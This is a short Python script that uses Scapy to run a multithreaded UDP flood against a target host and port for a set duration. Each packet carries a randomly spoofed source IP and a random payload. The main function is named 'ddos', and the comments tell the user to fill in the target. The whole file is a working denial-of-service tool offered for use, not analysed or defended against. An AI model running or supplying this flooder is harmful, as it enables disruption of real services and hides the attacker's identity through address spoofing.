from scapy.all import IP, UDP, send, RandIP, RandString
import time
import random
import threading

def send_packets(target_ip, target_port, duration):
    # Create a UDP packet with random source IP and payload
    packet = IP(src=RandIP(), dst=target_ip) / UDP(dport=target_port) / RandString(size=random.randint(10, 100))

    # Send packets for the specified duration
    end_time = time.time() + duration
    while time.time() < end_time:
        send(packet, verbose=0)

def ddos(target_ip, target_port, duration, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Target IP and port
    target_ip = "example.com"  # Replace with the target IP or domain
    target_port = 80  # Replace with the target port

    # Duration of the attack in seconds
    duration = 60  # 1 minute

    # Number of threads to use
    num_threads = 10

    ddos(target_ip, target_port, duration, num_threads)
